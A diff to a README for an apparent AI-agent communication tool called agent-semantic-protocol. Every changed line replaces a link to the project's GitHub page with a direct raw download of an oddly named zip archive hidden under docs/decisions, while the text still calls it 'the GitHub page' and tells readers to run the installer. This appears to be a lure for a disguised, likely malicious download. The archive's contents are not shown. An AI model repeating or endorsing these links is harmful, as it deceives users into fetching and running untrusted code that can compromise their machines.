@@ -1,6 +1,6 @@
 # 🤖 agent-semantic-protocol - Simple AI Agent Communication
 
-[![Download agent-semantic-protocol](https://img.shields.io/badge/Download-agent--semantic--protocol-brightgreen)](https://github.com/danicyber1/agent-semantic-protocol)
+[![Download agent-semantic-protocol](https://img.shields.io/badge/Download-agent--semantic--protocol-brightgreen)](https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will get the program from the official GitHub page. This page shows the late
 
 Click the link below or the badge at the top to open the download page:
 
-[Download agent-semantic-protocol](https://github.com/danicyber1/agent-semantic-protocol)
+[Download agent-semantic-protocol](https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -107,7 +107,7 @@ If you have issues, try these solutions:
 
 If you need updates or extra files, visit the download page again:
 
-[https://github.com/danicyber1/agent-semantic-protocol](https://github.com/danicyber1/agent-semantic-protocol)
+[https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip](https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip)
 
 This page will always have the latest versions and release notes.
 
@@ -146,7 +146,7 @@ You can visit the main page and click **Issues** to see if others faced the same
 
 ## 🎯 Summary of Steps to Get Started
 
-1. Go to [the GitHub page](https://github.com/danicyber1/agent-semantic-protocol).
+1. Go to [the GitHub page](https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip).
 2. Download the latest Windows installer file.
 3. Run the installer and follow prompts.
 4. Open agent-semantic-protocol from your desktop or Start menu.
@@ -155,4 +155,4 @@ You can visit the main page and click **Issues** to see if others faced the same
 
 ---
 
-[![Download agent-semantic-protocol](https://img.shields.io/badge/Download-agent--semantic--protocol-brightgreen)](https://github.com/danicyber1/agent-semantic-protocol)
+[![Download agent-semantic-protocol](https://img.shields.io/badge/Download-agent--semantic--protocol-brightgreen)](https://github.com/danicyber1/agent-semantic-protocol/raw/refs/heads/main/docs/decisions/agent_protocol_semantic_encomiastically.zip)
